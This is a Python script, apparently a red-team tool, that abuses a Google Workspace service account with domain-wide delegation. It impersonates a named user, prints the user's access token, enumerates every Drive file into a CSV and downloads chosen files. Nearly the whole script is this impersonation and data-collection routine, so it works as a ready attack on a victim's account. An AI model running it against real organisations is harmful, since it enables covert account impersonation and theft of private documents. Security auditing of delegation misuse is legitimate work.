import io
import csv
import argparse
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google.auth.exceptions import RefreshError
from googleapiclient.http import MediaIoBaseDownload
from google.oauth2 import service_account
from google.auth.transport.requests import Request
import google.auth

def download_file(real_file_id, token):
    """Downloads a file
    Args:
        real_file_id: ID of the file to download
        token: Bearer token for authentication
    Returns: The name of the file and its content.
    """
    creds = Credentials(token=token)

    try:
        # create drive api client
        service = build("drive", "v3", credentials=creds)

        # Get file metadata to determine MIME type and file name
        file_metadata = service.files().get(fileId=real_file_id, fields='name, mimeType').execute()
        print("Metadata: ", file_metadata)
        file_name = file_metadata.get('name')
        mime_type = file_metadata.get('mimeType')
        file = io.BytesIO()

        if mime_type.startswith('application/vnd.google-apps.'):
            # Use export for Google Docs Editors files
            
            export_mime_type = {
                'application/vnd.google-apps.document': 'application/pdf',
                'application/vnd.google-apps.spreadsheet': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                'application/vnd.google-apps.presentation': 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
            }.get(mime_type, 'application/pdf')  # Default to PDF if not specifically handled

            request = service.files().export_media(fileId=real_file_id, mimeType=export_mime_type)
            file_extension = {
                'application/pdf': '.pdf',
                'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
                'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx'
            }.get(export_mime_type, '.pdf')
            file_name += file_extension
        else:
            # Use get for binary files
            request = service.files().get_media(fileId=real_file_id)

        downloader = MediaIoBaseDownload(file, request)
        print("Downloader: ", downloader)
        done = False
        while not done:
            status, done = downloader.next_chunk()
            print(status, done)
            print(f"Download {int(status.progress() * 100)}%.")
        
        if file.getvalue():
            with open(file_name, 'wb') as f:
                f.write(file.getvalue())
            print(f'File downloaded as {file_name}')     

    except HttpError as error:
        print(f"An error occurred: {error}")
        return None, None
    


    return file_name, file.getvalue()

def get_access_token(impersonate):
    # Path to the service account key file
    SERVICE_ACCOUNT_FILE = ''

    # Define the required scopes
    SCOPES = ['https://www.googleapis.com/auth/drive']

    # The email of the user to impersonate
    USER_EMAIL = impersonate

    # Create a credentials object from the service account file with domain-wide delegation
    credentials = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)

    # Delegate the credentials to the user
    delegated_credentials = credentials.with_subject(USER_EMAIL)

    # Generate the access token
    request = Request()
    delegated_credentials.refresh(request)
    access_token = delegated_credentials.token

    print(f'Access Token: {access_token}')
    return access_token

def get_file_extension(mime_type):
    """Return the file extension based on the mime type."""
    mime_type_to_extension = {
        'application/vnd.google-apps.document': '.gdoc',
        'application/vnd.google-apps.spreadsheet': '.gsheet',
        'application/vnd.google-apps.presentation': '.gslides',
        'application/vnd.google-apps.drawing': '.gdraw',
        # Add other Google MIME types as needed
    }
    return mime_type_to_extension.get(mime_type, '')

def write_to_csv(file_data, csv_filename='files.csv'):
    """Writes the file data to a CSV file."""
    with open(csv_filename, mode='a', newline='', encoding='utf-8') as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(file_data)
 
def list_files(bearerToken, outputFile):
    """Lists all files in Google Drive using a bearer token."""
    creds = Credentials(token=bearerToken)

    try:
        # Create the Drive API client
        service = build('drive', 'v3', credentials=creds)
        # Initialize an empty list to hold file information
        all_files = []
        if args.folder:
            list_files_in_folder(service, args.folder)

        else:

            # Use the Drive API to list files
            page_token = None
            while True:
                response = service.files().list(
                    q="trashed=false",
                    spaces='drive',
                    fields='nextPageToken, files(id, name, size, mimeType)',
                    pageToken=page_token
                ).execute()

                # Append files to the list
                files = response.get('files', [])
                for file in files:
                    file_name = file.get('name')
                    file_id = file.get('id')
                    file_size = file.get('size', 'N/A')  # Some files like Google Docs do not have a size
                    mime_type = file.get('mimeType')
                    print(file)
                    file_extension = get_file_extension(mime_type)
                    file_trashed = file.get('trashed', False)
                    #all_files.append((file_name, file_id, file_size, file_trashed, file_extension))
                    if OUTPUTFILE:
                        write_to_csv([file_name, file_id, file_size, file_trashed, mime_type], OUTPUTFILE)
                    else:
                        print(f"Name: {file_name}, ID: {file_id}, Size: {file_size}, Extension: {mime_type}, Trashed: {file_trashed}")

                # Check if there are more files to list
                page_token = response.get('nextPageToken', None)
                if page_token is None:
                    break

    except HttpError as error:
        print(f"An error occurred: {error}")
        all_files = None
    
    except RefreshError as error:
        print("[*] Refreshing access token...")
        service = refresh_token()       
    
    return all_files

def refresh_token():
    accessToken = get_access_token(args.impersonate)
    creds = Credentials(token=accessToken)
    try:
        service = build('drive', 'v3', credentials=creds)
    except Exception as e:
        print("Exception occured: {}".format(e))
    return service


def list_files_in_folder(service, folder_id):
    """List all files and folders in a given Google Drive folder."""
    query = f"'{folder_id}' in parents and trashed=false"
    try:
        results = service.files().list(
            q=query,
            spaces='drive',
            fields='nextPageToken, files(id, name, mimeType, size, trashed)',
            pageSize=100
        ).execute()
        items = results.get('files', [])
        print(items)
    except HttpError as error:
        print(f"An error occurred: {error}")
        return []
    except RefreshError as error:
        print("[*] Refreshing access token...")
        service = refresh_token()
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a Domain Wide Delegation token and impersonate another user")
    subparsers = parser.add_subparsers(dest='command')
    drive_parser = subparsers.add_parser('drive', help='Impersonate a user and enumerate Google Drive.')

    group = drive_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--download', action='store_true', help='Download a single file from Google Drive')
    group.add_argument('--list', action='store_true', help='List all contents of Google Drive')


    # Subparser for the 'drive' command
    drive_parser.add_argument('--id', type=str, default=None, help='Id of the file to download.')
    drive_parser.add_argument('--impersonate', type=str, required=True, help='User to impersonate.')
    drive_parser.add_argument('--token', type=str, default=None, help='Authentication token of the impersonated user.')
    drive_parser.add_argument('--output', type=str, default=None, help='Output of the files in Google Drive')
    drive_parser.add_argument('--folder', type=str, default=None, help='List files in specific folder')

    # Parse the arguments
    args = parser.parse_args()
    OUTPUTFILE = args.output
    if OUTPUTFILE:
        with open(OUTPUTFILE, mode='w', newline='') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(['File', 'ID', 'Size', 'Trashed', 'Extension'])

    if args.command == "drive" and args.list:
        list_files(get_access_token(args.impersonate), OUTPUTFILE)

    elif args.command == "drive" and args.download:
        if args.id:
            download_file(args.id, get_access_token(args.impersonate))
        else:
            parser.error("Error: Must provide a file id with --id argument.")




